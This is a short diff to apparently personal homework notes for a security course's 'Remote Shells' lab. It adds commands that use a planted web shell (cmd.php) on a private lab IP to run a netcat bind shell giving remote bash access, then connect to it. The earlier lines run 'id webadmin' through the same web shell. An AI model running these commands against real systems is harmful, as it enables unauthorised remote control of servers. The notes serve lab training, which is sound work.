@@ -15,3 +15,12 @@ lynx 192.168.200.156
 #Quit Lynx with q, then run on student@remote-shells-homework:
 curl 'http://192.168.200.156/cmd.php?c=id%20webadmin'
 ```
+
+## h 6.4 p
+```bash
+#Remote Shells HOMEWORK - terminal 1:
+curl 'http://192.168.200.156/cmd.php?c=nc+-e+/bin/bash+-lvp+7331'
+
+#Remote Shells HOMEWORK - terminal 2:
+nc 192.168.200.156 7331
+```
